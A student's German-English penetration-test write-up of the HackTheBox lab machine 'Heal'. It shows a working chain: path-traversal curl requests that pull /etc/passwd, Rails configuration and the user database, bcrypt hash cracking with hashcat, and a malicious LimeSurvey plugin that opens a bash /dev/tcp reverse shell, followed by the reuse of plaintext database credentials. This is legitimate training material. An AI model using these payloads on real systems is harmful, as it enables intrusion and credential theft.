# Machine 1: Heal

## Management Summary

In this penetration test, we targeted the active HackTheBox machine "Heal", which meets the required difficulty level (Medium) and appears to have an HTTP service running on port 80. The objective was to compromise the machine and retrieve the user flag, documenting all identified vulnerabilities and providing remediation recommendations.

![1744655136679](image/Dokumentation/1744655136679.png)

## Network Setup

Als erstes habe ich mich mit HTB durch openvpn verbunden: 

```bash
sudo apt update
                                                                       
sudo apt install openvpn -yd

sudo openvpn Desktop/lab_lyfe691.ovpn

```
Das war erfoglreich wie man auf der HTB website sehen kann: 

![alt text](image.png)

## Target Discovery

Die target ip ist: 10.10.11.46

Um sicherzustellen, dass ein Dienst auf Port 80 aktiv ist, habe ich einen nmap scan durchgeführt:

```bash
nmap -p 80 10.10.11.46
```

Resultat:

```shell
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-14 13:57 EDT
Nmap scan report for 10.10.11.46
Host is up (0.10s latency).

PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 2.33 seconds
```

wie man sehen kann, gibt es einen service auf port 80

## DNS Configuration for heal.htb

Da ich verbunden bin habe ich mich entschieden auf http://10.10.11.46 zugehen um den service anzuschauen. Als ich drauf ging hat es mich nach heal.htb redirected, unten der beweis: 

```shell
┌──(kali㉿kali)-[~]
└─$ curl -I http://10.10.11.46

HTTP/1.1 301 Moved Permanently
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 14 Apr 2025 18:38:43 GMT
Content-Type: text/html
Content-Length: 178
Connection: keep-alive
Location: http://heal.htb/
```
Damit ich die Seite sehen konnte, musste ich den Hostnamen lokal auflösen. Dazu habe ich die Datei /etc/hosts bearbeitet und heal.htb auf die ip addresse der Maschine verwiesen.

```bash
sudo nano /etc/hosts
```

added line:

```bash
10.10.11.46    heal.htb
```

![1744656432925](image/Dokumentation/1744656432925.png)

Diese Konfiguration ermöglichte es uns, die Weboberfläche über den korrekten virtuellen Host zu erreichen.

## Initial Web Recon – heal.htb

Dank der konfiguration kann ich jetzt die seite auf firefox sehen.
Wie man sehen kann, wird eine login page angezeigt, was darauf hindeutet, dass ein Backend existiert.

![1744660028161](image/Dokumentation/1744660028161.png)

Darum habe ich die Login-Seite getestet, und wie erwartet wurde ein Fehler angezeigt. Daher habe ich die console überprüft, um zu sehen, ob es irgendwo hindeuted.

![1744660324409](image/Dokumentation/1744660324409.png)

Der error `Cross-Origin Request Blocked: The Same Origin Policy disallows reading the remote resource at http://api.heal.htb/signin.` zeigt an das die seite versucht eine request zu machen an ein API backend, api.heal.htb

## Subdomain Enumeration – api.heal.htb

Damit ich die API sehen kann, habe ich, wie bereits bei heal.htb, den Eintrag in der Datei /etc/hosts hinzugefügt.

```bash
sudo nano /etc/hosts
```

added line:

```bash
10.10.11.46    api.heal.htb
```

![1744663293352](image/Dokumentation/1744663293352.png)

Sobald ich das hinzugefügt habe, können wir direkt mit der API interagieren.

## Framework Fingerprinting

Ich benutze curl um kurz zu sehen was es ergibt

```bash
curl -i http://api.heal.htb/
```
Die Antwort zeigte deutlich, dass die Seite von Ruby on Rails Version 7.1.4 betrieben wird. Beim Zugriff über Firefox wurde die standardmässige rails seite angezeigt.

![1744664202485](image/Dokumentation/1744664202485.png)

Response headers:

```shell
x-runtime: 0.024878
x-request-id: <...>
x-content-type-options: nosniff
Server: nginx/1.18.0 (Ubuntu)
```

## Looking at what i have found

Da ich jetzt zugriff auf die api habe, kann ich die bisher gefundenen sahcen testen. Das login und reigster der app funktionieren wie erwartet.

Wenn ich mich registriere sehe ich die resume builder web app: 

![1744665182786](image/Dokumentation/1744665182786.png)

Ich habe mich ein bisschen mehr erkundet und sah die folgenden seiten: 

profile page:

![1744665820487](image/Dokumentation/1744665820487.png)

survey page: 

![1744665981729](image/Dokumentation/1744665981729.png)

## Survey inspection

Auf der survey page habe ich den button gehovert und es zeigte eine php page und eine neue sub domain (`take-survey.heal.htb`) an (im unterricht haben wir das mit php angeschaut und dachte mir das ich xss oder so probieren könnte). 

![alt text](indexphpsh.png)

wie immer, damit ich die seite ansehen kann habe ich den Eintrag in der Datei /etc/hosts hinzugefügt.

```bash
sudo nano /etc/hosts
```

added line:

```bash
10.10.11.46    take-survey.heal.htb
```

![alt text](Screenshot_2025-04-18_20_53_22.png)


so, jetzt kann ich die survey page sehen: 

![alt text](Screenshot_2025-04-18_21_05_21.png)

ich habe das survey gesendet, bin zurück und dann auf die expired seite gekommen, was mir sagrt das es ein admin gibt, `ralph@heal.htb`. 

![alt text](Screenshot_2025-04-19_15_13_54.png)

Das sagt mir das es auch einen Admin login oder so geben sollte. Deswegen habe ich mich entschieden einfach mal /admin zu machen um zu sehen ob es etwas gibt: 

![alt text](image-1.png)

wie man sehen kann hat es ein admin panel, aber da ich die login daten nicht weis muss ich einen weg finden um sie herauszufinden.

## Ralphs password


Nachdem auf der Survey expired‑Seite die Adresse ralph@heal.htb aufgetaucht war, brauchten wir nur noch dessen Kennwort, um uns in das Admin‑Backend einzuloggen.



1. JWT‑Token abgreifen
Beim Registrieren‑/Anmelden auf heal.htb wurde im Network‑Tab das JSON‑Feld token zurückgeliefert.

![image with  in dev tools token: ey](image-3.png)

```bash
export TOKEN='eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo3fQ.bN47YVxPM1ZVqbw4J7oHZeDc3ixY3KO6yZpM5M3nfZE'
```

Mit einem schnellen Check verifizierte ich, dass das Token gültig war:

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ curl -i -H "Authorization: Bearer $TOKEN" http://api.heal.htb/profile  
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 19 Apr 2025 21:17:14 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 86
Connection: keep-alive
x-frame-options: SAMEORIGIN
x-xss-protection: 0
x-content-type-options: nosniff
x-permitted-cross-domain-policies: none
referrer-policy: strict-origin-when-cross-origin
vary: Accept, Origin
etag: W/"534bdd1e70aef84ee6023d1856c79b2e"
cache-control: max-age=0, private, must-revalidate
x-request-id: 5aba65c9-294b-432b-96df-f578c04f8c48
x-runtime: 0.003895

{"id":7,"email":"lyfe@gmail.com","fullname":"lyfe","username":"lyfe","is_admin":false}  
```

2. Path‑Traversal verifizieren
Um die benötigte Anzahl ../ zu bestimmen, habe ich ein Mini‑Loop gebaut:

```bash
for d in {3..9}; do
  printf "[%s] " $d
  curl -s -H "Authorization: Bearer $TOKEN" \
       "http://api.heal.htb/download?filename=$(printf '../%.0s' $(seq 1 $d))/etc/passwd" |
       head -1
done
```

Ergebnis - bei fünf Punkten erschien /etc/passwd, Tiefe 2 zeigte eine vorhandene config.ru:

```
[3] {"errors":"File not found"}[4] {"errors":"File not found"}[5] root:x:0:0:root:/root:/bin/bash
[6] root:x:0:0:root:/root:/bin/bash
[7] root:x:0:0:root:/root:/bin/bash
[8] root:x:0:0:root:/root:/bin/bash
[9] root:x:0:0:root:/root:/bin/bash
```


3. Rails‑Konfiguration exfiltrieren

```bash
curl -s -H "Authorization: Bearer $TOKEN" \
     "http://api.heal.htb/download?filename=../../config/database.yml" \
     -o database.yml
```

output (unser ziel ist production):

```yaml
# SQLite. Versions 3.8.0 and up are supported.
#   gem install sqlite3
#
#   Ensure the SQLite 3 gem is defined in your Gemfile
#   gem "sqlite3"
#
default: &default
  adapter: sqlite3
  pool: <%= ENV.fetch("RAILS_MAX_THREADS") { 5 } %>
  timeout: 5000

development:
  <<: *default
  database: storage/development.sqlite3

# Warning: The database defined as "test" will be erased and
# re-generated from your development database when you run "rake".
# Do not set this db to the same as development or production.
test:
  <<: *default
  database: storage/test.sqlite3

production:
  <<: *default
  database: storage/development.sqlite3
```
4. SQLite‑DB herunterladen

```bash
curl -s -H "Authorization: Bearer $TOKEN" \
     "http://api.heal.htb/download?filename=../../storage/development.sqlite3" \
     -o dev.sqlite3
file dev.sqlite3          # → SQLite 3.x database
```
output: 

```
dev.sqlite3: SQLite 3.x database, last written using SQLite version 3045002, writer version 2, read version 2, file counter 2, database pages 8, cookie 0x4, schema 4, UTF-8, version-valid-for 2

```

5. Hashes dumpen

```bash
sqlite3 dev.sqlite3 \
  "SELECT email, password_digest FROM users;" > hashes.txt
```

hashes.txt:
```txt
ralph@heal.htb|$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG
test@htb.com|$2a$12$b/eb1KU/r9RfpyVRp2aBP.rDxE3p7.rRAjM8lCd0iLUnZh26VSpu.
nullbyte@heal.htb|$2a$12$xTfKk9gpBpZiSvIE.T5mMufHbAm/.c/kDKTBYg8cKcHxPwwU7gJgy
asdasd@gmail.com|$2a$12$5BTVuxrZTe31BRYWHD2ex.1FdTANkQnqSsaGwWgHBGq0heNTDlqGG
admii@gmail.com|$2a$12$HqR3ffCia8NuIrBFjS6tvexo/DDeBlCV5pwvo.v3WO6Z0iZM1/vaG
admin@gmail.com|$2a$12$Xe.3wFV2bDQHgJ8Bx6zX.uRho9IqV9i1o5mYT8x/0N.DSdLX25.GO
lyfe@gmail.com|$2a$12$j6pguy5SKwp6DppLiMtz1OQJS9ALkxTGInJkB9f/o6zcms5.D5Zre
```


6. Nur Ralphs Hash isolieren & cracken

```bash
grep '^ralph@' hashes.txt | cut -d'|' -f2 > ralph.hash
```
```bash
# rockyou ggf. entpacken da ich es noch nicht entpackt hatte:
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
```
```bash
# show flag zeigt den output an
hashcat -m 3200 ralph.hash /usr/share/wordlists/rockyou.txt --show
```

Hashcat‑Output:

`$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG:147258369`

nice, jetzt haben wir ralphs pwd: `147258369`

7. Erfolgreicher Admin‑Login

Mit

```
Benutzer : ralph@heal.htb
Passwort : 147258369
```

konnte ich mich unter http://take‑survey.heal.htb/admin einloggen und erhielt vollen Zugriff auf das LimeSurvey‑Backend (Version 6.6.4).

![alt text](Screenshot_2025-04-19_17_49_00.png)

## Reverse Shell – www-data via LimeSurvey Plugin Upload

Nachdem ich Zugriff auf das Admin‑Panel von LimeSurvey hatte, habe nach der version 6.6.4 gesucht und habe im internet gefunden das es ein rce exploit gibt:

https://github.com/N4s1rl1/Limesurvey-6.6.4-RCE

Da Standard‑Payloads die Web‑UI oft zum Absturz bringen (504 Gateway Timeout), habe ich ein nicht-blockierendes Reverse‑Shell‑Plugin erstellt, das sich problemlos installieren und triggern lässt.

1. Exploit‑Plugin bauen, mit hilfe des github: https://github.com/N4s1rl1/Limesurvey-6.6.4-RCE

```bash
mkdir -p ~/heal_plugin && cd ~/heal_plugin
```

Reverse‑Shell als PHP‑Datei:
```php
cat > php-rev.php <<'EOF'
<?php
$ip = '10.10.14.199';  // ← meine tun0‑IP
$port = 9001;          // ← Listener‑Port

$cmd = "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'";
$payload = "curl -s -X POST --data \"\$($cmd)\" http://$ip:$port &";
system($payload);
?>
EOF
```

Plugin‑Metadaten (config.xml): 

```xml
cat > config.xml <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<config>
  <metadata>
    <name>lyfe691-exploit</name>
    <type>plugin</type>
    <author>lyfe691</author>
    <version>1.0</version>
    <description>non-blocking reverse shell plugin</description>
    <license>GPLv3</license>
  </metadata>

  <files>
    <file>php-rev.php</file>
  </files>

  <compatibility>
    <version>6.0</version>
    <version>6.1</version>
    <version>6.6</version>
  </compatibility>
</config>
EOF
```

Zip-Archiv erstellen:

```bash
zip lyfe691-exploit.zip php-rev.php config.xml
```

2. Plugin hochladen und aktivieren

Im Web-Interface unter http://take‑survey.heal.htb/admin:

    Configuration -> Plugins

    Klick auf Upload & install -> lyfe691-exploit.zip auswählen

    Installieren: 

![alt text](Screenshot_2025-04-19_20_22_46.png)

    Und dann noch aktivieren: 

![alt text](Screenshot_2025-04-19_20_23_11.png)



3. Listener auf Kali öffnen

`nc -lvnp 9001`

4. Reverse Shell triggern

Im Browser:

`http://take-survey.heal.htb/upload/plugins/lyfe691-exploit/php-rev.php`

-> Shell poppt in Kali auf:

```bash
connect to [10.10.14.199] from (UNKNOWN) [10.10.11.46] 52792
www-data@heal:/var/www/limesurvey$
```
![alt text](Screenshot_2025-04-19_20_30_08.png)

Jetzt hatte ich eine voll funktionsfähige Shell als www-data auf der Maschine.

## User Flag

Nach dem Exploit über limesurvey hatte ich Zugriff als www-data.
Ziel war es nun, auf einen lokalen Benutzer mit echten Rechten zu wechseln. inkl userflag holen.

1. Web-Passwort war nicht systemweit gültig

Zuerst versuchte ich das bereits gecrackte Web‑Passwort von ralph@heal.htb (147258369) für lokale Benutzer:

su ralph     # → funktioniert nicht
su ron       # → ebenfalls fehlgeschlagen

Beide Logins gaben Authentication failure zurück.

Das bestätigte, dass die gehashten Passwörter aus der Rails‑Datenbank nur für die Web‑App galten – nicht für Linux-Accounts.

2. Datenbank‑Passwort holen

Im Verzeichnis:

`/var/www/limesurvey/application/config/`

fand ich in der Datei config.php die Zugangsdaten für die PostgreSQL-Datenbank – inklusive Plaintext-Passwort:

'username' => 'db_user',
'password' => 'AdmiDi0_pA$$w0rd',

Ganzer output: 
```php
www-data@heal:~/limesurvey/upload/plugins/lyfe691-exploit$ `cat /var/www/limesurvey/application/config/config.php`
<t /var/www/limesurvey/application/config/config.php       
<?php if (!defined('BASEPATH')) exit('No direct script access allowed');
/*
| -------------------------------------------------------------------
| DATABASE CONNECTIVITY SETTINGS
| -------------------------------------------------------------------
| This file will contain the settings needed to access your database.
|
| For complete instructions please consult the 'Database Connection'
| page of the User Guide.
|
| -------------------------------------------------------------------
| EXPLANATION OF VARIABLES
| -------------------------------------------------------------------
|
|    'connectionString' Hostname, database, port and database type for 
|     the connection. Driver example: mysql. Currently supported:
|                 mysql, pgsql, mssql, sqlite, oci
|    'username' The username used to connect to the database
|    'password' The password used to connect to the database
|    'tablePrefix' You can add an optional prefix, which will be added
|                 to the table name when using the Active Record class
|
*/
return array(
        'components' => array(
                'db' => array(
                        'connectionString' => 'pgsql:host=localhost;port=5432;user=db_user;password=AdmiDi0_pA$$w0rd;dbname=survey;',
                        'emulatePrepare' => true,
                        'username' => 'db_user', 
                        'password' => 'AdmiDi0_pA$$w0rd', <- pwd
                        'charset' => 'utf8',
                        'tablePrefix' => 'lime_',
                ),

                 'session' => array (
                        'sessionName'=>'LS-ZNIDJBOXUNKXWTIP',
                        // Uncomment the following lines if you need table-based sessions.
                        // Note: Table-based sessions are currently not supported on MSSQL server.
                        // 'class' => 'application.core.web.DbHttpSession',
                        // 'connectionID' => 'db',
                        // 'sessionTableName' => '{{sessions}}',
                 ),

                'urlManager' => array(
                        'urlFormat' => 'path',
                        'rules' => array(
                                // You can add your own rules here
                        ),
                        'showScriptName' => true,
                ),

                // If URLs generated while running on CLI are wrong, you need to set the baseUrl in the request component. For example:
                //'request' => array(
                //      'baseUrl' => '/limesurvey',
                //),
        ),
        // For security issue : it's better to set runtimePath out of web access
        // Directory must be readable and writable by the webuser
        // 'runtimePath'=>'/var/limesurvey/runtime/'
        // Use the following config variable to set modified optional settings copied from config-defaults.php
        'config'=>array(
        // debug: Set this to 1 if you are looking for errors. If you still get no errors after enabling this
        // then please check your error-logs - either in your hosting provider admin panel or in some /logs directory
        // on your webspace.
        // LimeSurvey developers: Set this to 2 to additionally display STRICT PHP error messages and get full access to standard templates
                'debug'=>0,
                'debugsql'=>0, // Set this to 1 to enanble sql logging, only active when debug = 2

                // If URLs generated while running on CLI are wrong, you need to uncomment the following line and set your
                // public URL (the URL facing survey participants). You will also need to set the request->baseUrl in the section above.
                //'publicurl' => 'https://www.example.org/limesurvey',

                // Update default LimeSurvey config here
        )
);
/* End of file config.php */
/* Location: ./application/config/config.php */
```

Da viele Systeme schwache Passwort‑Policies und Reuse verwenden, habe ich versucht, mich mit diesem Passwort als Benutzer ron einzuloggen.
3. su auf ron
```
www-data@heal:~/limesurvey/upload/plugins/lyfe691-exploit$ su ron
su ron                                                                                                                                                                                                                                      
Password: AdmiDi0_pA$$w0rd                                                                                                                                                                                                                  
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
```

War erfolgreich. 

4. User-Flag 

Nach dem Wechsel in rons home dings:

```
whoami
ron
cd
chdir: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory

ls -la
total 32
drwxr-x--- 4 ron  ron  4096 Apr 19 05:31 .
drwxr-xr-x 4 root root 4096 Dec  9 12:53 ..
lrwxrwxrwx 1 root root    9 Dec  9 12:57 .bash_history -> /dev/null
-rw-r--r-- 1 ron  ron   220 Dec  9 12:53 .bash_logout
-rw-r--r-- 1 ron  ron  3771 Dec  9 12:53 .bashrc
drwx------ 2 ron  ron  4096 Dec  9 15:13 .cache
-rw-r--r-- 1 ron  ron   807 Dec  9 12:53 .profile
drwx------ 2 ron  ron  4096 Apr 19 05:32 .ssh
-rw-r----- 1 root ron    33 Apr 18 10:09 user.txt

cat user.txt
d18da46a08d09ab95187edcc99ae1188
```

![alt text](Screenshot_2025-04-19_21_38_25.png)

wie man sehen kann ist das userflag: 

`d18da46a08d09ab95187edcc99ae1188`

HTB user flag owned:
 
![alt text](Screenshot_2025-04-19_21_40_41.png)











